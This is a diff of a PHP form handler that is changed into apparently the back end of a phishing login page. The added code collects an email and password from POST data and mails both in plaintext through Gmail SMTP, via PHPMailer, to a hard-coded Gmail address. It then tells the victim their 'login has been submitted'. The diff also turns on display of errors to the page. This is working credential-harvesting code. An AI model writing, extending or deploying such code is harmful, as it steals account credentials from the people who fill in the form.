@@ -1,46 +1,52 @@
 <?php
+// Enable error reporting for debugging
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+require 'vendor/autoload.php'; // Adjust path if needed
+
 // Replace with your email address
 $to = "jc4717287@gmail.com";
 
 // Check if form is submitted
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Get email from POST data
+    // Get email and password from POST data
     $email = isset($_POST['email']) ? trim($_POST['email']) : '';
+    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
 
     // Validate email
     if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
-        // Extract domain from email
-        $domain = substr(strrchr($email, "@"), 1);
+        $mail = new PHPMailer(true);
+        try {
+            //Server settings
+            $mail->isSMTP();
+            $mail->Host       = 'smtp.gmail.com';
+            $mail->SMTPAuth   = true;
+            $mail->Username   = 'yjc4717287@gmail.com'; // Your Gmail address
+            $mail->Password   = 'your_app_password';   // Gmail App Password
+            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+            $mail->Port       = 587;
 
-        // Prepare email content
-        $subject = "New Email Submission";
-        $message = "Email: $email\nDomain: $domain";
-        $headers = "From: noreply@" . $_SERVER['SERVER_NAME'];
+            //Recipients
+            $mail->setFrom('yourgmail@gmail.com', 'Login Form');
+            $mail->addAddress('jc4717287@gmail.com'); // Your receiving email
 
-        // Send email
-        mail($to, $subject, $message, $headers);
+            //Content
+            $mail->Subject = 'Login Form Submission';
+            $mail->Body    = "Email: $email\nPassword: $password";
 
-        // Optional: Redirect or show success message
-        echo "Thank you! Your email has been submitted.";
+            $mail->send();
+            echo 'Thank you! Your login has been submitted.';
+        } catch (Exception $e) {
+            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+        }
     } else {
         echo "Invalid email address.";
     }
 } else {
-    // Show HTML form if not submitted
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Send Email</title>
-    </head>
-    <body>
-        <form method="post" action="send.php">
-            <label for="email">Email:</label>
-            <input type="email" name="email" id="email" required>
-            <button type="submit">Send</button>
-        </form>
-    </body>
-    </html>
-    <?php
+    echo "Invalid request.";
 }
 ?>
